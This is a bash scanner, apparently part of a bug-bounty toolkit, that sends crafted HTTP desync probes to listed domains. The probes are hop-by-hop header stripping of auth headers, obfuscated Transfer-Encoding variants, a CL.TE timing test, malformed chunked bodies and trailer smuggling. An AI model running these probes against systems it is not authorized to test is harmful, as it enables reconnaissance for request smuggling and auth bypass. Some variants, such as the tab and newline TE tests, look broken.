#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  ct_desync.sh — HTTP Desync & Connection Abuse               ║
# ║  Hop-by-hop header abuse · TE variant fuzzing · CL mismatch ║
# ║  Chunked encoding abuse · Connection header manipulation     ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="ct_desync.sh"
SCRIPT_DESC="HTTP Desync & Connection Abuse"

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Test for HTTP desync via Connection header manipulation,"
    echo "  Transfer-Encoding variants, Content-Length mismatches,"
    echo "  and chunked encoding abuse."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  --domains FILE         File with domains (one per line)"
    echo "  -u, --urls FILE        File with URLs to test (one per line)"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "7" "$SCRIPT_DESC"

if [ -z "${DOMAIN:-}" ] && [ -z "${DOMAINS_FILE:-}" ] && [ -z "${URLS_FILE:-}" ]; then
    err "Provide --domain, --domains, or --urls"
    script_usage
    exit 1
fi

# ── Build target URL list ─────────────────────────────────────
TARGET_URLS="${OUT_DIR}/_ct_desync_targets.txt"
> "$TARGET_URLS"

DESYNC_PATHS=("/" "/api/" "/login" "/search" "/graphql" "/index.html")

if [ -n "${URLS_FILE:-}" ] && [ -f "$URLS_FILE" ]; then
    head -30 "$URLS_FILE" >> "$TARGET_URLS"
fi

build_desync_urls() {
    local domain="$1"
    for path in "${DESYNC_PATHS[@]}"; do
        echo "https://${domain}${path}" >> "$TARGET_URLS"
    done
}

if [ -n "${DOMAINS_FILE:-}" ] && [ -f "$DOMAINS_FILE" ]; then
    while IFS= read -r d; do
        [ -z "$d" ] && continue
        d=$(echo "$d" | sed 's/\*\.//')
        build_desync_urls "$d"
    done < "$DOMAINS_FILE"
elif [ -n "${DOMAIN:-}" ]; then
    build_desync_urls "$(echo "$DOMAIN" | sed 's/\*\.//')"
fi

sort -u -o "$TARGET_URLS" "$TARGET_URLS"
url_count=$(count_lines "$TARGET_URLS")
info "Testing ${url_count} URLs for HTTP desync"

# ── Output file ───────────────────────────────────────────────
FINDINGS_FILE="${OUT_DIR}/ct_desync_findings.txt"
> "$FINDINGS_FILE"

# ── Timing threshold for desync detection ─────────────────────
TIMING_THRESHOLD=5

# ── Helper: measure request timing ───────────────────────────
time_request() {
    local url="$1"
    shift
    curl -sk -o /dev/null -w "%{time_total}" \
        --connect-timeout 8 --max-time 20 \
        "${HUNT_UA_CURL[@]}" "$@" "$url" 2>/dev/null || echo "0"
}

# ── Helper: baseline timing (average of 2 requests) ──────────
get_baseline() {
    local url="$1"
    local t1 t2
    t1=$(time_request "$url")
    t2=$(time_request "$url")
    echo "$t1 $t2" | awk '{printf "%.2f", ($1+$2)/2}'
}

# ── Helper: check timing differential ────────────────────────
is_delayed() {
    local test_time="$1"
    local baseline="$2"
    echo "$test_time $baseline $TIMING_THRESHOLD" | awk '{diff=$1-$2; print (diff >= $3) ? "1" : "0"}'
}

# ── Main desync testing loop ─────────────────────────────────
tested=0

while IFS= read -r url; do
    [ -z "$url" ] && continue
    ((tested++)) || true

    # Quick liveness check
    http_code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" "$url" 2>/dev/null || echo "000")
    if [ "$http_code" = "000" ]; then
        continue
    fi

    url_host=$(echo "$url" | sed 's|https\?://||;s|/.*||')
    info "[${tested}/${url_count}] ${url} (HTTP ${http_code})"

    baseline=$(get_baseline "$url")
    log "  Baseline: ${baseline}s"

    # ═══════════════════════════════════════════════════════════
    # Test 1: Connection header hop-by-hop abuse
    # ═══════════════════════════════════════════════════════════
    info "  Testing hop-by-hop header abuse..."

    # Test if Connection header can strip important headers from proxy
    HOP_HEADERS=(
        "X-Forwarded-For"
        "X-Real-IP"
        "X-Forwarded-Host"
        "X-Forwarded-Proto"
        "Authorization"
        "Cookie"
        "X-Api-Key"
        "Transfer-Encoding"
        "Content-Length"
        "X-Forwarded-Port"
    )

    for hop in "${HOP_HEADERS[@]}"; do
        # Request with Connection: <header> — tells proxy to strip that header
        resp_with=$(curl -sk -o /dev/null -w "%{http_code}:%{size_download}" \
            --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" \
            -H "Connection: close, ${hop}" \
            "$url" 2>/dev/null || echo "000:0")

        # Normal request for comparison
        resp_normal=$(curl -sk -o /dev/null -w "%{http_code}:%{size_download}" \
            --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" \
            "$url" 2>/dev/null || echo "000:0")

        status_with="${resp_with%%:*}"
        status_normal="${resp_normal%%:*}"
        size_with="${resp_with##*:}"
        size_normal="${resp_normal##*:}"

        if [ "$status_with" != "$status_normal" ] && [ "$status_with" != "000" ]; then
            echo "[MEDIUM] HOP-BY-HOP: ${url} | Connection: ${hop} | Normal: ${status_normal}/${size_normal} | Hop: ${status_with}/${size_with}" >> "$FINDINGS_FILE"
            log "  ${YELLOW}[MEDIUM]${NC} Hop-by-hop diff via Connection: ${hop} (${status_normal} -> ${status_with})"

            # If stripping auth headers causes access change, that's high severity
            if [[ "$hop" =~ ^(Authorization|Cookie|X-Api-Key)$ ]] && [ "$status_with" != "$status_normal" ]; then
                echo "[HIGH] HOP-BY-HOP AUTH STRIP: ${url} | Stripped: ${hop} | ${status_normal} -> ${status_with}" >> "$FINDINGS_FILE"
                warn "  ${RED}[HIGH]${NC} Hop-by-hop stripped ${hop}: ${url} (${status_normal} -> ${status_with})"
            fi
        fi

        # Check for significant size difference (may indicate different content served)
        if [ "$status_with" = "$status_normal" ] && [ "$size_with" != "0" ] && [ "$size_normal" != "0" ]; then
            size_diff=$((size_with - size_normal))
            size_diff=${size_diff#-}  # absolute value
            if [ "$size_diff" -gt 500 ]; then
                echo "[INFO] HOP-BY-HOP SIZE DIFF: ${url} | Connection: ${hop} | Normal: ${size_normal}b | Hop: ${size_with}b | Diff: ${size_diff}b" >> "$FINDINGS_FILE"
            fi
        fi
    done

    # ═══════════════════════════════════════════════════════════
    # Test 2: Transfer-Encoding variant fuzzing
    # ═══════════════════════════════════════════════════════════
    info "  Testing Transfer-Encoding variants..."

    # Test various TE obfuscations that may cause front-end/back-end disagreement
    declare -A TE_TESTS=(
        ["TE_normal"]="Transfer-Encoding: chunked"
        ["TE_xchunked"]="Transfer-Encoding: xchunked"
        ["TE_double"]="Transfer-Encoding: chunked, chunked"
        ["TE_tab"]="Transfer-Encoding:${$'\t'}chunked"
        ["TE_trailing_space"]="Transfer-Encoding: chunked "
        ["TE_case_mix"]="Transfer-encoding: chunked"
        ["TE_UPPER"]="TRANSFER-ENCODING: chunked"
        ["TE_chunk"]="Transfer-Encoding: chunk"
        ["TE_cow"]="Transfer-Encoding: cow"
        ["TE_space_before_colon"]="Transfer-Encoding : chunked"
        ["TE_newline"]="Transfer-Encoding: chunked"
        ["TE_null"]="Transfer-Encoding: chunked%00"
    )

    for label in "${!TE_TESTS[@]}"; do
        te_header="${TE_TESTS[$label]}"

        te_resp=$(curl -sk -D- -o /dev/null -w "\n%{http_code}" \
            --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" \
            -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "${te_header}" \
            --data-binary $'0\r\n\r\n' \
            "$url" 2>/dev/null || echo "")

        te_status=$(echo "$te_resp" | tail -1 | tr -d '\r\n')
        [ -z "$te_status" ] && te_status="000"

        # Compare to normal chunked response
        normal_chunked=$(curl -sk -o /dev/null -w "%{http_code}" \
            --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" \
            -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Transfer-Encoding: chunked" \
            --data-binary $'0\r\n\r\n' \
            "$url" 2>/dev/null || echo "000")

        if [ "$te_status" != "$normal_chunked" ] && [ "$te_status" != "000" ] && [ "$label" != "TE_normal" ]; then
            echo "[MEDIUM] TE VARIANT DIFF: ${url} | ${label}: ${te_status} | Normal chunked: ${normal_chunked}" >> "$FINDINGS_FILE"
            log "  ${YELLOW}[MEDIUM]${NC} TE variant ${label}: ${te_status} vs normal: ${normal_chunked}"
        fi

        # Check for 400 Bad Request (server rejects the variant = good defense)
        if [ "$te_status" = "400" ] && [ "$label" != "TE_normal" ]; then
            echo "[INFO] ${url} rejects ${label} with 400 (good defense)" >> "$FINDINGS_FILE"
        fi
    done

    # ═══════════════════════════════════════════════════════════
    # Test 3: Transfer-Encoding in Connection header
    # ═══════════════════════════════════════════════════════════
    info "  Testing TE via Connection header..."

    te_conn_time=$(time_request "$url" \
        -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Connection: Transfer-Encoding" \
        -H "Transfer-Encoding: chunked" \
        -H "Content-Length: 4" \
        --data-binary $'0\r\n\r\nG')

    delayed=$(is_delayed "$te_conn_time" "$baseline")
    if [ "$delayed" = "1" ]; then
        echo "[HIGH] TE VIA CONNECTION: ${url} | Time: ${te_conn_time}s | Baseline: ${baseline}s" >> "$FINDINGS_FILE"
        warn "  ${RED}[HIGH]${NC} TE in Connection header causes delay at ${url}"
    fi

    # ═══════════════════════════════════════════════════════════
    # Test 4: Content-Length mismatch detection
    # ═══════════════════════════════════════════════════════════
    info "  Testing Content-Length mismatch..."

    # Send body longer than Content-Length claims
    cl_short_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Content-Length: 3" \
        --data-binary "test=extradataextradata" \
        "$url" 2>/dev/null || echo "000")

    # Send body shorter than Content-Length claims (should timeout or error)
    cl_long_time=$(time_request "$url" \
        -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Content-Length: 100" \
        --data-binary "short")

    cl_delayed=$(is_delayed "$cl_long_time" "$baseline")
    if [ "$cl_delayed" = "1" ]; then
        echo "[MEDIUM] CL MISMATCH DELAY: ${url} | CL=100, body=5 | Time: ${cl_long_time}s | Baseline: ${baseline}s" >> "$FINDINGS_FILE"
        log "  ${YELLOW}[MEDIUM]${NC} CL mismatch delay at ${url} (${cl_long_time}s)"
    fi

    # Check if server accepts shorter body without error (lenient parsing)
    if [ "$cl_short_status" = "200" ]; then
        echo "[INFO] ${url} accepts CL shorter than body (lenient CL parsing)" >> "$FINDINGS_FILE"
    fi

    # ═══════════════════════════════════════════════════════════
    # Test 5: Chunked encoding abuse
    # ═══════════════════════════════════════════════════════════
    info "  Testing chunked encoding abuse..."

    # Zero-length chunk in middle (should be treated as final chunk)
    zero_mid_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Transfer-Encoding: chunked" \
        --data-binary $'0\r\n\r\n4\r\ntest\r\n0\r\n\r\n' \
        "$url" 2>/dev/null || echo "000")

    normal_chunk_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Transfer-Encoding: chunked" \
        --data-binary $'4\r\ntest\r\n0\r\n\r\n' \
        "$url" 2>/dev/null || echo "000")

    if [ "$zero_mid_status" != "$normal_chunk_status" ] && [ "$zero_mid_status" != "000" ]; then
        echo "[MEDIUM] CHUNKED ABUSE: ${url} | Zero-mid: ${zero_mid_status} | Normal: ${normal_chunk_status}" >> "$FINDINGS_FILE"
        log "  ${YELLOW}[MEDIUM]${NC} Chunked zero-mid difference at ${url}"
    fi

    # Hex-prefix chunk size (e.g., 0x4 instead of 4)
    hex_chunk_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Transfer-Encoding: chunked" \
        --data-binary $'0x4\r\ntest\r\n0\r\n\r\n' \
        "$url" 2>/dev/null || echo "000")

    if [ "$hex_chunk_status" != "$normal_chunk_status" ] && [ "$hex_chunk_status" != "000" ] && [ "$hex_chunk_status" != "400" ]; then
        echo "[MEDIUM] CHUNKED HEX: ${url} | Hex prefix: ${hex_chunk_status} | Normal: ${normal_chunk_status}" >> "$FINDINGS_FILE"
        log "  ${YELLOW}[MEDIUM]${NC} Chunked hex prefix accepted at ${url}"
    fi

    # Chunk extension (data after size, separated by semicolon)
    ext_chunk_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Transfer-Encoding: chunked" \
        --data-binary $'4;ext=val\r\ntest\r\n0\r\n\r\n' \
        "$url" 2>/dev/null || echo "000")

    if [ "$ext_chunk_status" = "200" ]; then
        echo "[INFO] ${url} accepts chunk extensions (4;ext=val)" >> "$FINDINGS_FILE"
    fi

    # ═══════════════════════════════════════════════════════════
    # Test 6: HTTP/1.0 vs HTTP/1.1 behavior difference
    # ═══════════════════════════════════════════════════════════
    info "  Testing HTTP version behavior..."

    h10_status=$(curl -sk -o /dev/null -w "%{http_code}:%{size_download}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        --http1.0 \
        "$url" 2>/dev/null || echo "000:0")

    h11_status=$(curl -sk -o /dev/null -w "%{http_code}:%{size_download}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        --http1.1 \
        "$url" 2>/dev/null || echo "000:0")

    h10_code="${h10_status%%:*}"
    h11_code="${h11_status%%:*}"
    h10_size="${h10_status##*:}"
    h11_size="${h11_status##*:}"

    if [ "$h10_code" != "$h11_code" ] && [ "$h10_code" != "000" ]; then
        echo "[INFO] HTTP VERSION DIFF: ${url} | H1.0: ${h10_code}/${h10_size} | H1.1: ${h11_code}/${h11_size}" >> "$FINDINGS_FILE"
    fi

    # ═══════════════════════════════════════════════════════════
    # Test 7: Trailer header abuse
    # ═══════════════════════════════════════════════════════════
    info "  Testing trailer header abuse..."

    trailer_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Transfer-Encoding: chunked" \
        -H "Trailer: X-Smuggled" \
        --data-binary $'4\r\ntest\r\n0\r\nX-Smuggled: true\r\n\r\n' \
        "$url" 2>/dev/null || echo "000")

    if [ "$trailer_status" = "200" ]; then
        echo "[INFO] ${url} accepts chunked trailers (Trailer: X-Smuggled)" >> "$FINDINGS_FILE"
    fi

    # ═══════════════════════════════════════════════════════════
    # Test 8: Keep-Alive header injection
    # ═══════════════════════════════════════════════════════════
    info "  Testing Keep-Alive abuse..."

    ka_resp=$(curl -sk -D- -o /dev/null --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -H "Connection: keep-alive" \
        -H "Keep-Alive: timeout=5, max=1000" \
        "$url" 2>/dev/null || echo "")

    if echo "$ka_resp" | grep -qi 'keep-alive'; then
        ka_value=$(echo "$ka_resp" | grep -i '^keep-alive:' | head -1 | sed 's/^[^:]*:[[:space:]]*//' | tr -d '\r')
        echo "[INFO] ${url} responds with Keep-Alive: ${ka_value}" >> "$FINDINGS_FILE"
    fi

done < "$TARGET_URLS"

# ── Cleanup ───────────────────────────────────────────────────
rm -f "$TARGET_URLS"

# ── Summary ───────────────────────────────────────────────────
if [ -s "$FINDINGS_FILE" ]; then
    sort -u -o "$FINDINGS_FILE" "$FINDINGS_FILE"
fi
finding_count=$(count_lines "$FINDINGS_FILE")
high_count=$(grep -c '^\[HIGH\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
medium_count=$(grep -c '^\[MEDIUM\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
info_count=$(grep -c '^\[INFO\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)

log "HTTP desync: ${finding_count} total findings"
log "  HIGH (desync/strip confirmed):  ${high_count}"
log "  MEDIUM (TE/CL differences):     ${medium_count}"
log "  INFO (behavioral observations): ${info_count}"
log "Tested ${tested} URLs"
if [ "$high_count" -gt 0 ]; then
    warn "High-severity desync findings detected — review for smuggling exploitation"
fi
log "Results: ${FINDINGS_FILE}"
